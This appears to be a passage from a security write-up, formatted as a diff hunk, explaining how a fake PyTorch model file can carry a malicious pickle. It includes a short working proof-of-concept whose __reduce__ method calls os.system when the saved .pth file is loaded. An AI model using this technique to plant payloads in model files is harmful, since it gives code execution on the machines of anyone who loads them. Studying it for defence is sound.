@@ -1,0 +1,1 @@
+e to poisoning an existing model is just to create a dummy “model” that contains a malicious pickle file. This simple Python / PyTorch POC will work: import torch import os class Payload : def __reduce__ ( self ): return ( os . system , ( " id " ,)) sploit = Payload () torch . save ( sploit , ' root_sploit_id.pth ' ) I’ll install PyTorch and then run
